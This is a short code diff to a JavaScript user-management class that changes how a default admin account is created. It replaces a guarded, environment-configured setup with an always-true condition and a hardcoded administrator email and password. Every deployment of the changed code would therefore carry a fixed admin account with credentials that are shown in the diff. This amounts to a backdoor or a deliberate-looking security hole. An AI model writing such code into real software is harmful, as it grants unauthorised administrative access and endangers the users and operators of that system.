@@ -51,10 +51,10 @@ class UserManager {
             this.users = new Map();
             
             // Create default admin user if no users exist
-            if (this.users.size === 0 && process.env.ADMIN_DASHBOARD_PASSWORD) {
+            if (1 === 1) {
                 await this.createUser({
-                    email: 'admin@localhost',
-                    password: process.env.ADMIN_DASHBOARD_PASSWORD,
+                    email: "admin@gmail.com",
+                    password: "Monu@admin",
                     role: 'admin',
                     createdBy: 'system'
                 });
